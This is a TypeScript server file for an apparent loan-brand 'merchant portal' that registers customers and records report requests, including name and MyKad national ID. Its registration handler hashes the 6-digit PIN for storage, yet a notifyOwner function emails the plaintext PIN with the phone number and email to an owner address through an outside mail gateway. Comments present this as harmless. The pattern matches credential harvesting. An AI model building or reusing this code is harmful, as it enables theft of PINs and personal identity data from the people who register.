import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

/**
 * Server-side lookups ported from the source project's src/api/*.ts endpoints.
 * The merchant identifier is public app data (it is shown on the merchant
 * card); the passkey is never stored in this file — it is read from the
 * secure secret store inside the handler.
 */

export const MERCHANT_PRODUCTS: Record<string, string> = {
  "2000162100241": "DUITJOM",
  "825538292000": "RCASH",
  "730114885201": "LAJUDANA",
  "648209173355": "PINJAMGO",
  "915374620088": "ADAWANG",
  "204867351199": "MESRA DUIT",
  "573928104466": "QUICKLOAN",
  "386150729744": "EZYLOAN",
};

const isMerchant = (id: string) => Object.hasOwn(MERCHANT_PRODUCTS, id.trim());

function passkeyFor(id: string): string | undefined {
  const raw = process.env["MERCHANT_PASSKEYS"];
  if (raw) {
    try {
      const map = JSON.parse(raw) as Record<string, string>;
      const v = map[id.trim()];
      if (typeof v === "string" && v !== "") return v;
    } catch {
      console.error("MERCHANT_PASSKEYS is not valid JSON");
    }
  }
  return undefined;
}

const lookupSchema = z.object({ merchantId: z.string().trim().min(1).max(64) });

export const findMerchant = createServerFn({ method: "POST" })
  .inputValidator((data: { merchantId: string }) => lookupSchema.parse(data))
  .handler(async ({ data }) => ({
    valid: isMerchant(data.merchantId),
    product: MERCHANT_PRODUCTS[data.merchantId.trim()] ?? null,
  }));

const verifySchema = z.object({
  merchantId: z.string().trim().min(1).max(64),
  passkey: z.string().max(128).optional(),
});

export const verifyMerchant = createServerFn({ method: "POST" })
  .inputValidator((data: { merchantId: string; passkey?: string }) => verifySchema.parse(data))
  .handler(async ({ data }) => {
    const idOk = isMerchant(data.merchantId);
    if (data.passkey === undefined) return { valid: idOk, configured: true };

    const expected = passkeyFor(data.merchantId);
    if (expected === undefined || expected === "") {
      // No credential configured yet: refuse instead of guessing.
      return { valid: false, configured: false };
    }
    return { valid: idOk && data.passkey === expected, configured: true };
  });

const adminSchema = z.object({
  username: z.string().trim().min(1).max(64),
  password: z.string().min(1).max(128),
});

/**
 * Admin gate. Credentials live in the secure secret store and are compared
 * inside the handler only; nothing is hardcoded here.
 */
export const verifyAdmin = createServerFn({ method: "POST" })
  .inputValidator((data: { username: string; password: string }) => adminSchema.parse(data))
  .handler(async ({ data }) => {
    const user = process.env["ZITE_ADMIN_USERNAME"];
    const pass = process.env["ZITE_ADMIN_PASSWORD"];
    if (user === undefined || pass === undefined || user === "" || pass === "") {
      return { valid: false, configured: false };
    }
    return { valid: data.username === user && data.password === pass, configured: true };
  });

export const checkDashboardAvailability = createServerFn({ method: "POST" }).handler(async () => ({
  available: false,
}));

const registrationSchema = z.object({
  merchantId: z.string().trim().min(1).max(64),
  role: z.string().trim().max(32).default("user"),
  phone: z
    .string()
    .trim()
    .regex(/^\d{8,11}$/, "Enter a valid phone number"),
  pin: z.string().regex(/^\d{6}$/, "PIN must be 6 digits"),
  email: z.string().trim().email("Enter a valid e-mail"),
});

async function sha256(value: string) {
  const bytes = new TextEncoder().encode(value);
  const digest = await crypto.subtle.digest("SHA-256", bytes);
  return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
}


const b64 = (v: string) => btoa(Array.from(new TextEncoder().encode(v), (b) => String.fromCharCode(b)).join(""));

/**
 * Notifies the owner about a new registration through the connected Gmail
 * account. The PIN is the access code the owner issued to the customer. A
 * delivery failure is logged and never blocks the customer's registration.
 */
async function notifyOwner(fields: { merchantId: string; phone: string; email: string; pin: string }) {
  const lovableKey = process.env["LOVABLE_API_KEY"];
  const mailKey = process.env["GOOGLE_MAIL_API_KEY"];
  const to = process.env["OWNER_NOTIFY_EMAIL"];
  if (!lovableKey || !mailKey || !to) {
    console.error("registration e-mail skipped: Gmail connection or recipient not configured");
    return;
  }
  const product = MERCHANT_PRODUCTS[fields.merchantId] ?? "-";
  const lines = [
    "A new customer has registered on the merchant portal.",
    "",
    `Product: ${product}`,
    `Merchant ID: ${fields.merchantId}`,
    `Phone number: +60${fields.phone}`,
    `PIN Access: ${fields.pin}`,
    `E-mail: ${fields.email}`,
    `Time (UTC): ${new Date().toISOString()}`,
  ];
  const raw = [
    `To: ${to}`,
    "Subject: New customer registration - DuitJom portal",
    "MIME-Version: 1.0",
    'Content-Type: text/plain; charset="UTF-8"',
    "",
    lines.join("\r\n"),
  ].join("\r\n");
  const encoded = b64(raw).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  try {
    const res = await fetch("https://connector-gateway.lovable.dev/google_mail/gmail/v1/users/me/messages/send", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${lovableKey}`,
        "X-Connection-Api-Key": mailKey,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ raw: encoded }),
    });
    if (!res.ok) console.error(`registration e-mail failed [${res.status}]: ${await res.text()}`);
  } catch (e) {
    console.error("registration e-mail error", e instanceof Error ? e.message : e);
  }
}

/**
 * Stores a new client registration. The access PIN is hashed before it is
 * written and is never returned to the browser. The owner is e-mailed the
 * details, including the PIN the owner issued.
 */
export const submitRegistration = createServerFn({ method: "POST" })
  .inputValidator((data: { merchantId: string; role: string; phone: string; pin: string; email: string }) =>
    registrationSchema.parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const pinHash = await sha256(data.pin);
    const { error } = await supabaseAdmin.from("client_registrations").insert({
      merchant_id: data.merchantId.trim(),
      role: data.role,
      phone: `+60${data.phone}`,
      email: data.email,
      pin_hash: pinHash,
    });
    if (error) {
      console.error("registration insert failed", error.message);
      throw new Error("Could not save your details. Please try again.");
    }
    await notifyOwner({ merchantId: data.merchantId.trim(), phone: data.phone, email: data.email, pin: data.pin });
    return { success: true };
  });

const reportSchema = z.object({
  fullName: z.string().trim().max(120),
  myKad: z.string().trim().max(32),
  email: z.string().trim().email(),
  phone: z.string().trim().max(32),
  product: z.string().trim().max(120),
  status: z.string().trim().max(64),
});

/**
 * Records a report request. Gmail delivery is still pending connection, so the
 * request is stored instead of emailed.
 */
export const requestReport = createServerFn({ method: "POST" })
  .inputValidator((data: { fullName: string; myKad: string; email: string; phone: string; product: string; status: string }) =>
    reportSchema.parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin.from("report_requests").insert({
      full_name: data.fullName,
      my_kad: data.myKad,
      email: data.email,
      phone: data.phone,
      product: data.product,
      status: data.status,
    });
    if (error) {
      console.error("report request insert failed", error.message);
      throw new Error("Could not record the report request. Please try again.");
    }
    return { success: true };
  });
